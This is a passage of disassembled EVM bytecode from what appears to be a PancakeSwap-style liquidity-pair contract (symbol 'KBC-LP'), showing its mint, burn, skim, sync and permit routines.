DUP1 ISZERO PUSH2 0xF40 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF56 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0xF75 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xF92 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFA0 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0xFDD JUMPI PUSH2 0xFC9 PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22F6 JUMP JUMPDEST SWAP9 POP PUSH2 0xFD8 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x102C JUMP JUMPDEST PUSH2 0x1029 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1001 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x101C DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1023 JUMPI INVALID JUMPDEST DIV PUSH2 0x23CC JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x106B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2690 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1075 DUP11 DUP11 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x10B1 JUMPI PUSH1 0xB SLOAD PUSH2 0x10AD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1174 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1184 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x11F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x120A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x126C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1282 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x12A1 DUP9 DUP9 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x12B8 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12BF JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x12D3 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12DA JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x12ED JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x1328 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2627 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1332 ADDRESS DUP5 PUSH2 0x23E4 JUMP JUMPDEST PUSH2 0x133D DUP8 DUP14 DUP14 PUSH2 0x1C69 JUMP JUMPDEST PUSH2 0x1348 DUP7 DUP14 DUP13 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x13A2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x13B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1404 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1418 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x142E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x143E DUP6 DUP6 DUP12 DUP12 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x146E JUMPI PUSH1 0xB SLOAD PUSH2 0x146A SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0xF DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1559 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x1608 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x166F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x16DF JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x17FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1830 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1881 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x188C DUP10 DUP10 DUP10 PUSH2 0x2079 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x18E2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x18F2 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1946 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x195A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1970 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19C3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x19D7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1A0C DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A29 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A37 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1A70 JUMPI PUSH2 0x1A5B PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1A6A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1A90 JUMP JUMPDEST PUSH2 0x1A8D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1ACF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25FF PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1AD9 DUP11 DUP11 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1B52 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1C62 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1BB7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1BCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C2E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C44 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xF SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 